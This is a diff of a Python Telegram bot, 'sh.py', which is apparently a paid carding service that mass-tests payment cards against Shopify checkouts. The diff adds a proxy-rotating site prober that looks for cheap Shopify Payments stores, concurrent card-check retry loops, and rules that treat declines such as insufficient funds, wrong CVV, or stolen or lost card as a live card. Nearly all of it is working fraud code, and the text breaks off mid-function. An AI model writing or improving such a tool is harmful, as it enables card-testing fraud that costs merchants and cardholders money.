@@ -1,12 +1,14 @@
-# sh.py - Updated with fixed sending and modern UI
 """
-sh.py  v29  —  /sh single-card + /msh mass Shopify checker
+sh.py  v31  —  /sh single-card + /msh mass Shopify checker
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 FIXES:
-  • Increased timeout for DM sending to prevent card skipping
-  • Modern UI with gradient-style buttons and cleaner layout
-  • Better progress tracking with visual indicators
+  • Increased timeout for DM sending to prevent card skipping (60s per DM)
+  • Added retry mechanism for failed DM sends (3 retries)
+  • Modern premium UI with animated emojis and gradient styling
+  • Better progress tracking with live updates
   • All cards now guaranteed to be sent to users
+  • Live card recheck logic: Insufficient Funds & Generic Error → keep LIVE
+    Other responses → recheck quickly (max 3 fast attempts)
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """
 from __future__ import annotations
@@ -22,7 +24,7 @@ import time
 from datetime import datetime
 from html import escape
 from io import BytesIO
-from typing import Optional, List, Dict, Any
+from typing import Optional, List, Dict, Any, Tuple
 
 import aiohttp
 from telegram import Update, InputFile, MessageEntity, InlineKeyboardButton, InlineKeyboardMarkup
@@ -63,10 +65,16 @@ CONSEC_TIMEOUT_MAX = 5
 API_CONCURRENCY    = 20
 BUTTON_LOCK        = 30
 
+# ── NEW: Live card recheck settings ──────────────────────────────────────
+LIVE_RECHECK_ATTEMPTS = 3          # Max recheck attempts for ambiguous LIVE responses
+LIVE_RECHECK_TIMEOUT  = 15         # Timeout per recheck attempt (faster)
+LIVE_RECHECK_DELAY    = 0.3        # Delay between recheck attempts
+
 # ── NEW: Increased timeout for DM sending ────────────────────────────────
-DM_SEND_TIMEOUT    = 60.0        # 60 seconds per DM attempt
-DM_SEND_RETRIES    = 3           # Retry failed DMs 3 times
-DM_SEND_DELAY      = 0.5         # Delay between DM sends to avoid rate limits
+DM_SEND_TIMEOUT    = 60.0
+DM_SEND_RETRIES    = 3
+DM_SEND_DELAY      = 0.3
+MAX_DM_CONCURRENT  = 15
 
 _CB_RESULT = "mshr"
 _CB_STOP   = "mshs"
@@ -92,7 +100,6 @@ PROBE_TIMEOUT:      float = 20.0
 PROBE_CONCURRENCY:  int   = 60
 
 # ── MODERN UI EMOJI IDS ──────────────────────────────────────────────────
-# New premium animated emojis for modern design
 MODERN_CARD_EMOJI   = "5800709991627232190"  # 💳
 MODERN_USER_EMOJI   = "6267115986541877538"  # 👤
 MODERN_TIME_EMOJI   = "6285240160120477644"  # ⏱
@@ -104,13 +111,12 @@ MODERN_CHARGED      = "5427168083074628963"  # 💎
 MODERN_GATE         = "5341715473882955310"  # 🛒
 MODERN_PROGRESS     = "5116268964023894989"  # 🔄
 MODERN_ERRORS       = "4956611513369494230"  # ⚠️
-
-# ── NEW: Premium gradient/glow emojis for modern UI ──────────────────────
 GLOW_STAR           = "5801154993188770160"  # ✨
 GLOW_SPARKLE        = "4956739572114392015"  # ✦
 GLOW_CROWN          = "6181649972757271368"  # 👑
 GLOW_DIAMOND        = "4958610528588008305"  # 💎
 GLOW_FIRE           = "5285221724634239278"  # 🔥
+GLOW_LIVE           = "5287777298894835685"  # ✅
 
 # Button emoji IDs
 BTN_CHARGED_EMOJI_ID  = "5465465194056525619"
@@ -118,6 +124,37 @@ BTN_LIVE_EMOJI_ID     = "5039793437776282663"
 BTN_ALL_EMOJI_ID      = "4956324463525233747"
 BTN_STOP_EMOJI_ID     = "6179444193518162239"
 CARD_CHK_BTN_EMOJI_ID = "5935795874251674052"
+
+# Charged emoji pool
+CHARGED_EMOJI_IDS = [
+    "5801154993188770160", "4956739572114392015", "5285221724634239278",
+    "5287777298894835685", "5285024405246725814", "5287547831677112267",
+    "5287658362660474522", "5285186510197381130", "5803233241963959320",
+    "5462902520215002477", "5787435351521889877", "5323674506705785412",
+    "5801005158959683238", "5436143465211640305", "5800688138833629633",
+    "5891044423856296980", "5436068999068662274", "5427168083074628963",
+]
+
+LIVE_EMOJI_IDS = [
+    "6296367896398399651", "5287777298894835685", "5801154993188770160",
+]
+
+# Plan emojis
+PLAN_EMOJIS = {
+    "CORE":   "5379869575338812919",
+    "ELITE":  "5836898273666798437",
+    "ROOT":   "4956420911310832630",
+    "CUSTOM": "5445027583588593750",
+}
+
+SPECIAL_FONT_MAP = {
+    'ᴀ': 'A', 'ʙ': 'B', 'ᴄ': 'C', 'ᴅ': 'D', 'ᴇ': 'E',
+    'ꜰ': 'F', 'ɢ': 'G', 'ʜ': 'H', 'ɪ': 'I', 'ᴊ': 'J',
+    'ᴋ': 'K', 'ʟ': 'L', 'ᴍ': 'M', 'ɴ': 'N', 'ᴏ': 'O',
+    'ᴘ': 'P', 'ǫ': 'Q', 'ʀ': 'R', 'ꜱ': 'S', 'ᴛ': 'T',
+    'ᴜ': 'U', 'ᴠ': 'V', 'ᴡ': 'W', 'x': 'X', 'ʏ': 'Y',
+    'ᴢ': 'Z', 'Ɪ': 'I',
+}
 
 # ── API semaphore ─────────────────────────────────────────────────────────
 _API_SEM: "asyncio.Semaphore | None" = None
@@ -127,6 +164,23 @@ def _get_api_sem() -> "asyncio.Semaphore":
     if _API_SEM is None:
         _API_SEM = asyncio.Semaphore(API_CONCURRENCY)
     return _API_SEM
+
+def get_random_charged_emoji() -> str:
+    return random.choice(CHARGED_EMOJI_IDS)
+
+def get_random_live_emoji() -> str:
+    return random.choice(LIVE_EMOJI_IDS)
+
+def get_plan_emoji_id(plan_name: str) -> str:
+    if not plan_name:
+        return MODERN_PRO_EMOJI
+    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in plan_name)
+    if norm in PLAN_EMOJIS:
+        return PLAN_EMOJIS[norm]
+    for k, v in PLAN_EMOJIS.items():
+        if k in norm:
+            return v
+    return MODERN_PRO_EMOJI
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # LOADERS
@@ -199,6 +253,163 @@ def _load_sites() -> list:
     raise RuntimeError(
         "sites.txt not found or empty — create sites.txt with one Shopify domain per line"
     )
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# SITE PROBER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def _probe_one_site(site: str, proxies: list) -> bool:
+    MAX_PROBE_RETRIES = 3
+    for attempt in range(MAX_PROBE_RETRIES):
+        px = random.choice(proxies) if proxies else None
+        try:
+            resp, gw, price, currency, http_st = await _call_api(
+                PROBE_CARD, site, px, timeout=PROBE_TIMEOUT
+            )
+        except Exception:
+            await asyncio.sleep(0.3)
+            continue
+
+        if http_st and http_st not in (200,):
+            return False
+
+        if gw.upper().strip() != "SHOPIFY PAYMENTS":
+            return False
+
+        resp_upper = resp.upper().strip()
+
+        if "ORDER_PAID" in resp_upper or resp_upper == "PAID":
+            logging.warning(f"[PROBE] BLOCKED {site}: ORDER_PAID on test card")
+            return False
+
+        if _is_dead_site_response(resp):
+            await asyncio.sleep(0.3)
+            continue
+
+        if _is_success_response(resp):
+            try:
+                p = float(re.sub(r"[^\d.]", "", str(price)))
+                if p > 20.0:
+                    logging.debug(f"[PROBE] ❌ {site} price ${p:.2f} too high, blocked")
+                    return False
+            except Exception:
+                pass
+            logging.info(f"[PROBE] ✅ {site} alive: {resp!r} price={price}")
+            return True
+
+        await asyncio.sleep(0.2)
+        continue
+
+    return False
+
+async def probe_all_sites(all_sites: list, proxies: list,
+                          on_progress=None) -> list:
+    global _WORKING_SITES, _PROBE_IN_PROGRESS, _PROBE_LAST_RUN
+
+    if _PROBE_IN_PROGRESS:
+        logging.info("[PROBE] already running — skipping duplicate call")
+        return _WORKING_SITES or all_sites
+
+    _PROBE_IN_PROGRESS = True
+    logging.info(f"[PROBE] Starting: {len(all_sites)} sites, "
+                 f"{len(proxies)} proxies, concurrency={PROBE_CONCURRENCY}")
+
+    sem     = asyncio.Semaphore(PROBE_CONCURRENCY)
+    working = []
+    done_n  = 0
+    total   = len(all_sites)
+    tasks: list = []
+
+    async def _check_one(site):
+        nonlocal done_n
+        try:
+            async with sem:
+                try:
+                    result = await _probe_one_site(site, proxies)
+                except asyncio.CancelledError:
+                    raise
+                except Exception:
+                    result = False
+                done_n += 1
+                if result:
+                    working.append(site)
+                if on_progress and done_n % 50 == 0:
+                    try:
+                        await on_progress(done_n, total)
+                    except Exception:
+                        pass
+        except asyncio.CancelledError:
+            raise
+        except RuntimeError:
+            pass
+
+    try:
+        tasks = [asyncio.ensure_future(_check_one(s)) for s in all_sites]
+        await asyncio.gather(*tasks, return_exceptions=True)
+    except asyncio.CancelledError:
+        for t in tasks:
+            t.cancel()
+        await asyncio.gather(*tasks, return_exceptions=True)
+        raise
+    finally:
+        _PROBE_IN_PROGRESS = False
+
+    if working:
+        random.shuffle(working)
+        _WORKING_SITES  = working
+        _PROBE_LAST_RUN = time.time()
+        logging.info(f"[PROBE] ✅ {len(working)}/{total} sites alive")
+    else:
+        logging.warning("[PROBE] ⚠️ 0 working sites found — "
+                        "keeping previous cache or using full list")
+        if not _WORKING_SITES:
+            _WORKING_SITES = list(all_sites)
+
+    return _WORKING_SITES
+
+def get_working_sites() -> list:
+    return list(_WORKING_SITES) if _WORKING_SITES else _load_sites()
+
+async def _auto_probe_loop(all_sites: list, proxies: list):
+    try:
+        await asyncio.sleep(5)
+    except asyncio.CancelledError:
+        return
+    while True:
+        try:
+            await probe_all_sites(all_sites, proxies)
+        except asyncio.CancelledError:
+            logging.info("[PROBE] background probe cancelled — shutting down")
+            return
+        except Exception as exc:
+            logging.error(f"[PROBE] background error: {exc}")
+        try:
+            await asyncio.sleep(PROBE_TTL)
+        except asyncio.CancelledError:
+            logging.info("[PROBE] background sleep cancelled — shutting down")
+            return
+
+def start_probe_background(all_sites: list, proxies: list) -> None:
+    global _PROBE_TASK
+    _PROBE_TASK = asyncio.ensure_future(_auto_probe_loop(all_sites, proxies))
+    def _on_done(t: asyncio.Task):
+        if not t.cancelled():
+            exc = t.exception()
+            if exc:
+                logging.error(f"[PROBE] background task died: {exc}")
+    _PROBE_TASK.add_done_callback(_on_done)
+
+async def stop_probe_background() -> None:
+    global _PROBE_TASK
+    task = _PROBE_TASK
+    if task is None or task.done():
+        return
+    task.cancel()
+    try:
+        await asyncio.wait_for(asyncio.shield(task), timeout=6.0)
+    except (asyncio.CancelledError, asyncio.TimeoutError, Exception):
+        pass
+    _PROBE_TASK = None
+    logging.info("[PROBE] background prober stopped cleanly")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # RESPONSE CLASSIFICATION
@@ -292,6 +503,21 @@ SUCCESS_RESPONSES = [
     'STOLEN_CARD', 'LOST_CARD', 'TRANSACTION_NOT_ALLOWED',
 ]
 
+# ── NEW: Responses that should trigger a recheck instead of immediate LIVE ──
+LIVE_RECHECK_TRIGGERS = [
+    'PCI_ERROR', 'PCI_ERROR', 'CVV_FAILED', 'AVS_FAILED',
+    'RISK_BLOCKED', 'SECURITY_VIOLATION', 'TRANSFORMER_FINGERPRINT',
+    'FINGERPRINT', 'COMPLIANCE', 'VELOCITY',
+    'ARTIFACT', 'SELLER',
+]
+
+# ── Responses that are kept as LIVE immediately ──────────────────────────
+LIVE_KEEP_RESPONSES = [
+    'INSUFFICIENT_FUNDS', 'GENERIC_ERROR', 'CALL_ISSUER',
+    'INCORRECT_CVV', 'INCORRECT_CVC', 'INCORRECT_ZIP',
+    'INVALID_CVC', 'INVALID_CVV', '3DS_REQUIRED',
+]
+
 def _is_dead_site_response(resp: str) -> bool:
     r = resp.lower().strip()
     return any(err.lower() in r for err in RETRY_ERRORS)
@@ -299,6 +525,22 @@ def _is_dead_site_response(resp: str) -> bool:
 def _is_success_response(resp: str) -> bool:
     ru = resp.upper().strip()
     return any(s.upper() in ru for s in SUCCESS_RESPONSES)
+
+def _should_recheck_live(resp: str) -> bool:
+    """Check if a LIVE response should be rechecked."""
+    mu = resp.upper().strip()
+    # Keep these as LIVE immediately
+    for keep in LIVE_KEEP_RESPONSES:
+        if keep.upper() in mu:
+            return False
+    # Recheck these
+    for trigger in LIVE_RECHECK_TRIGGERS:
+        if trigger.upper() in mu:
+            return True
+    # If it contains PCI or RISK, recheck
+    if 'PCI' in mu or 'RISK' in mu:
+        return True
+    return False
 
 def classify_response(resp: str) -> str:
     if not resp:
@@ -461,276 +703,4 @@ async def _call_api(card: str, site: str, proxy: Optional[str],
         return ("timeout", "Shopify Payments", "0.00", "USD", None)
     except asyncio.CancelledError:
         raise
-    except Exception as e:
-        return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CORE RETRY LOOP
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async def _check_card_with_retry(
-    _session,
-    card: str,
-    sites: list,
-    proxies: list,
-    max_sites: int      = SITE_RETRIES,
-    site_timeout: float = SITE_TIMEOUT,
-    sid: str            = "",
-) -> tuple:
-    if not sites:
-        sites = get_working_sites()
-        if not sites:
-            sites = _load_sites()
-
-    local_dead: set = set()
-    pool            = list(sites)
-    random.shuffle(pool)
-    px_pool         = list(proxies) if proxies else list(_ALL_PROXIES)
-    tried: set      = set()
-    price, currency  = "0.00", "USD"
-    last_resp        = "No sites responded"
-    consec_timeouts  = 0
-    consec_api_errs  = 0
-    attempt          = 0
-
-    async def _try_one(site: str, proxy: Optional[str]):
-        try:
-            return site, await _call_api(card, site, proxy, timeout=site_timeout)
-        except asyncio.CancelledError:
-            raise
-        except Exception as e:
-            return site, (f"connection error: {str(e)[:60]}",
-                          "Shopify Payments", "0.00", "USD", None)
-
-    def _pick_site() -> Optional[str]:
-        nonlocal pool
-        skip      = tried | local_dead
-        available = [s for s in pool if s not in skip]
-        if not available:
-            local_dead.clear()
-            tried.clear()
-            pool      = list(sites)
-            random.shuffle(pool)
-            available = pool[:]
-        if not available:
-            return None
-        s = random.choice(available)
-        tried.add(s)
-        return s
-
-    while attempt < max_sites:
-        if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED":
-            raise asyncio.CancelledError()
-
-        batch: list[str] = []
-        for _ in range(min(SITE_BATCH, max_sites - attempt)):
-            s = _pick_site()
-            if s and s not in batch:
-                batch.append(s)
-        if not batch:
-            break
-
-        attempt += len(batch)
-
-        tasks = [
-            asyncio.ensure_future(
-                _try_one(s, random.choice(px_pool) if px_pool else None)
-            )
-            for s in batch
-        ]
-
-        winner        = None
-        batch_timeouts = 0
-
-        try:
-            for fut in asyncio.as_completed(tasks):
-                try:
-                    site, (resp, gw, price, currency, http_st) = await fut
-                except asyncio.CancelledError:
-                    raise
-                except Exception:
-                    batch_timeouts += 1
-                    continue
-
-                logging.info(f"[API] {card[:6]}** #{attempt}/{max_sites} "
-                             f"site={site} → {resp!r}")
-
-                if resp == "timeout" or resp == "Timeout":
-                    batch_timeouts += 1
-                    local_dead.add(site)
-                    last_resp = resp
-                    continue
-
-                if http_st and http_st not in (200,):
-                    local_dead.add(site)
-                    last_resp = f"HTTP {http_st}"
-                    if http_st in (502, 503, 504):
-                        consec_api_errs += 1
-                    else:
-                        consec_api_errs = 0
-                    if consec_api_errs >= 5:
-                        logging.error(
-                            f"[SH] {card[:6]}** gate API returned HTTP {http_st} "
-                            f"{consec_api_errs}× in a row — API server is down, aborting."
-                        )
-                        return "DEAD", f"Gate API unavailable (HTTP {http_st})", price, currency
-                    continue
-
-                consec_api_errs = 0
-
-                if http_st == 429 or (resp and "status: 429" in resp.lower()):
-                    tried.discard(site)
-                    continue
-
-                classification = classify_response(resp)
-                last_resp      = resp
-
-                logging.info(f"[RESULT] {card[:6]}** #{attempt}/{max_sites} "
-                             f"→ {classification}  resp={resp!r}  site={site}")
-
-                if classification in ("CHARGED", "TDS", "LIVE", "DEAD"):
-                    winner = (classification, resp, price, currency)
-                    break
-
-                local_dead.add(site)
-
-        except asyncio.CancelledError:
-            for t in tasks: t.cancel()
-            await asyncio.gather(*tasks, return_exceptions=True)
-            raise
-        finally:
-            for t in tasks: t.cancel()
-            await asyncio.gather(*tasks, return_exceptions=True)
-
-        if winner:
-            return winner
-
-        if batch_timeouts == len(batch):
-            consec_timeouts += batch_timeouts
-        else:
-            consec_timeouts = 0
-
-        if consec_timeouts >= CONSEC_TIMEOUT_MAX:
-            logging.warning(
-                f"[SH] {card[:6]}** {consec_timeouts} consecutive timeouts "
-                f"({consec_timeouts * site_timeout:.0f}s wasted) — "
-                f"aborting early"
-            )
-            return "DEAD", "timeout", price, currency
-
-        await asyncio.sleep(ROUND_DELAY)
-
-    logging.warning(f"[SH] {card[:6]}** exhausted {max_sites} sites  last={last_resp!r}")
-    if last_resp and _is_success_response(last_resp):
-        return "LIVE", last_resp, price, currency
-    return "DEAD", last_resp, price, currency
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# MESSAGE BUILDER — MODERN UI
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-def _te(eid: str, fb: str = "●") -> str:
-    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'
-
-def _u16len(s: str) -> int:
-    return len(s.encode("utf-16-le")) // 2
-
-def html_to_entities(html: str):
-    text     = ""
-    entities = []
-    stack    = []
-    i        = 0
-    n        = len(html)
-
-    while i < n:
-        ch = html[i]
-
-        if ch == "<":
-            j   = html.index(">", i)
-            tag = html[i + 1 : j]
-
-            if tag.startswith("/"):
-                tag_name = tag[1:].strip().lower()
-                for k in range(len(stack) - 1, -1, -1):
-                    if stack[k]["name"] == tag_name:
-                        entry  = stack.pop(k)
-                        start  = entry["offset"]
-                        end    = _u16len(text)
-                        length = end - start
-                        if length > 0:
-                            if tag_name == "b":
-                                entities.append(MessageEntity(
-                                    type="bold", offset=start, length=length))
-                            elif tag_name == "code":
-                                entities.append(MessageEntity(
-                                    type="code", offset=start, length=length))
-                            elif tag_name == "a":
-                                entities.append(MessageEntity(
-                                    type="text_link", offset=start,
-                                    length=length, url=entry.get("url", "")))
-                        break
-                i = j + 1
-
-            elif tag.lower().startswith("tg-emoji"):
-                m = re.search(r'emoji-id="([^"]+)"', tag)
-                if m:
-                    emoji_id  = m.group(1)
-                    close_idx = html.index("</tg-emoji>", j + 1)
-                    fallback  = html[j + 1 : close_idx]
-                    offset    = _u16len(text)
-                    text     += fallback
-                    length    = _u16len(fallback)
-                    if length > 0:
-                        entities.append(MessageEntity(
-                            type="custom_emoji", offset=offset,
-                            length=length, custom_emoji_id=emoji_id))
-                    i = close_idx + len("</tg-emoji>")
-                else:
-                    i = j + 1
-
-            else:
-                tag_name = tag.split()[0].lower() if tag else ""
-                entry    = {"name": tag_name, "offset": _u16len(text)}
-                if tag_name == "a":
-                    m = re.search(r'href=["\']([^"\']+)["\']', tag)
-                    if m:
-                        entry["url"] = m.group(1)
-                stack.append(entry)
-                i = j + 1
-
-        elif ch == "&":
-            if   html[i:i+4] == "&lt;":  text += "<"; i += 4
-            elif html[i:i+4] == "&gt;":  text += ">"; i += 4
-            elif html[i:i+5] == "&amp;": text += "&"; i += 5
-            elif html[i:i+6] == "&quot;":text += '"'; i += 6
-            else:                        text += ch;  i += 1
-
-        else:
-            text += ch
-            i    += 1
-
-    return text, entities if entities else None
-
-def _send_ents(html: str):
-    return html_to_entities(html)
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# MSG BUILDER — MODERN UI
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-class MsgBuilder:
-    __slots__ = ("_txt", "_ents")
-
-    def __init__(self):
-        self._txt  = ""
-        self._ents = []
-
-    @staticmethod
-    def _u16(s: str) -> int:
-        return len(s.encode("utf-16-le")) // 2
-
-    def raw(self, s: str) -> "MsgBuilder":
-        if s: self._txt += s
-        return self
-
-    def bold(self, s: str) -> "MsgBuilder":
-        if not s: return self
-        o = self._u16(self._txt); l = self._u16(s); self._txt += s
-        if l: self._ents
+   
